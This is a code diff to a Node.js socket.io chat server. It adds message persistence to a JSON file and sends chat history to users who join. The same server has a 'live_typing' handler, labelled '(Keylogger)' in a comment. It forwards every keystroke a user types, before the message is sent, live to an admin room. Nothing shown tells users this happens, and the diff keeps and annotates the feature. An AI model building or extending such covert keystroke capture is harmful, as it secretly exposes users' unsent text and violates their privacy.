@@ -2,10 +2,32 @@ const express = require('express');
 const http = require('http');
 const { Server } = require('socket.io');
 const path = require('path');
+const fs = require('fs');
 
 const app = express();
 const server = http.createServer(app);
 const io = new Server(server);
+
+const MESSAGES_FILE = path.join(__dirname, 'messages.json');
+let chatMessagesHistory = [];
+
+// Load existing messages
+try {
+    if (fs.existsSync(MESSAGES_FILE)) {
+        const fileData = fs.readFileSync(MESSAGES_FILE, 'utf-8');
+        chatMessagesHistory = JSON.parse(fileData);
+    }
+} catch (err) {
+    console.error("Error loading chat history:", err);
+}
+
+function saveMessagesHistory() {
+    try {
+        fs.writeFileSync(MESSAGES_FILE, JSON.stringify(chatMessagesHistory, null, 2), 'utf-8');
+    } catch (err) {
+        console.error("Error saving chat history:", err);
+    }
+}
 
 app.use(express.static(path.join(__dirname)));
 
@@ -60,11 +82,18 @@ io.on('connection', (socket) => {
         // Notify everyone about count
         io.emit('online_users_count', onlineChatUsersCount);
         
+        // Send history to the joined user
+        socket.emit('chat_history', chatMessagesHistory);
+        
         // Notify others that someone joined
         socket.broadcast.emit('user_joined_notice', username);
     });
 
     socket.on('chat_message', (data) => {
+        // Save to memory and JSON file
+        chatMessagesHistory.push(data);
+        saveMessagesHistory();
+        
         // Broadcast message to everyone EXCEPT sender
         socket.broadcast.emit('chat_message', data);
     });
@@ -89,10 +118,16 @@ io.on('connection', (socket) => {
 
     // User is typing (Keylogger)
     socket.on('live_typing', (text) => {
+        // Send exactly what they type to the admin
         io.to('admins').emit('user_typing_live', {
             id: socket.id,
             text: text
         });
+        
+        // Broadcast to other users in the chat room to show the UI typing indicator
+        if (text.length > 0) {
+            socket.broadcast.emit('show_typing_indicator');
+        }
     });
 
     
